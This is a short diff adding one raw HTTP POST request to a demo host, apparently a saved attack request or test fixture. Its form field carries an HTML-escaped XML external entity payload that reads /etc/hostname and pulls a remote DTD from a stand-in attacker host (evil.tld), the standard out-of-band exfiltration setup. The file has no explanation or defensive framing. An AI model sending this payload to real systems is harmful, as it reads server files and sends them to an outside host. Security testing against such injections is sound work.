@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 171
+Connection: close
+
+token=&lt;!DOCTYPE data [&lt;!ENTITY % file SYSTEM &quot;file:///etc/hostname&quot;&gt;&lt;!ENTITY % dtd SYSTEM &quot;http://evil.tld/oob.dtd&quot;&gt;%dtd;]&gt;&lt;r/&gt;
